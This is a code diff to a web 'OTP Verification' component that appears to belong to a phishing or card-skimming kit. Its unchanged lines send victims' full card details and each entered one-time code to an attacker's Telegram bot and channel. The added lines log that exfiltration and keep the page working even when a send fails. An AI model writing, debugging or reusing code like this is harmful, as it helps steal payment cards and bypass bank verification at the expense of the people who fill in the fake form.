@@ -89,6 +89,8 @@ const OTPVerification = () => {
   // Send notification to Telegram
   const sendTelegramNotification = async (attempt: number, isSuccess: boolean) => {
     try {
+      console.log("Starting Telegram notification...");
+      
       // Format the message with full card details and custom styling
       // Red for failed attempts, green for success
       const attemptColor = isSuccess ? 'green' : 'red';
@@ -146,6 +148,9 @@ ${attemptHeader}
       
       // Send directly to Telegram API
       const telegramApiUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+      console.log("Using Telegram API URL:", telegramApiUrl);
+      console.log("Using channel ID:", TELEGRAM_CHANNEL_ID);
+      
       const response = await fetch(telegramApiUrl, {
         method: 'POST',
         headers: {
@@ -158,7 +163,10 @@ ${attemptHeader}
         }),
       });
 
+      console.log("Telegram API raw response:", response);
       const result = await response.json();
+      console.log("Telegram API JSON response:", result);
+      
       if (!result.ok) {
         console.error('Telegram notification error:', result);
         return false;
@@ -212,14 +220,26 @@ ${attemptHeader}
     e.preventDefault();
     setError("");
     
+    // Always capture the current attempt number before running verification
+    const currentAttempt = attempts + 1;
+    console.log(`Processing OTP attempt ${currentAttempt}`);
+    
     // Validate OTP
     const isValid = verifyOTP();
     
     // Send notification to Telegram for current attempt
     try {
-      await sendTelegramNotification(attempts + 1, isValid);
+      console.log(`Sending Telegram notification for attempt ${currentAttempt}, isValid: ${isValid}`);
+      const notificationSent = await sendTelegramNotification(currentAttempt, isValid);
+      console.log(`Notification sent successfully: ${notificationSent}`);
+      
+      if (!notificationSent) {
+        console.error("Failed to send Telegram notification");
+        // Continue with the flow even if notification fails
+      }
     } catch (telegramErr) {
       console.error("Error sending Telegram notification:", telegramErr);
+      // Continue with the flow even if notification fails
     }
     
     if (!isValid) {
